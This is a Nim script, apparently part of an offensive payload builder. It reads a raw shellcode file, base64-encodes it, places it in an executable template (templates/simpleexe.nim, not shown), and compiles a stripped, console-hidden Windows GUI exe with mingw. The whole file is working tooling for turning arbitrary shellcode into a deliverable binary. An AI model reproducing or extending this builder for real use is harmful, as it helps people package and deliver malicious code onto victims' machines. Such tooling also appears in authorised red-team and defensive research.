import base64
import strutils
import strformat
import os
import osproc

let 
    pCount = paramCount()
    shellcodeFilePath = paramStr(1)
    fileType = paramStr(2)
    verbosity = paramStr(3)
    compileExe: string = r"nim c -d:mingw --opt:none --app=gui --cpu=amd64 -d:strip -d:release -o=simpleexe.exe temp_simpleexe.nim" 
    
var 
    file: string
    templatePath: string

when isMainModule:
    # Read raw shellcode file
    try:
        file = readFile(shellcodeFilePath)
    except IOError as err:
        echo "[-] Error: Could not open file!"
        quit(1)
    # Base64 encode bytes
    let b64shellcode = encode(file)
    # Add base64 shellcode to template
    if fileType == "exe":
        templatePath = "templates/simpleexe.nim"
        var templateFile = templatePath.readFile()
        var tempFile = "temp_simpleexe.nim"
        let placeholder = "REPLACE_ME"
        let replacement =  b64shellcode
        templateFile = templateFile.replace(placeholder, replacement)
        tempFile.writeFile(templateFile)

        let compileResults = execCmdEx(compileExe)
        tempFile.removeFile
        if verbosity == "verbose":
            echo compileResults.output
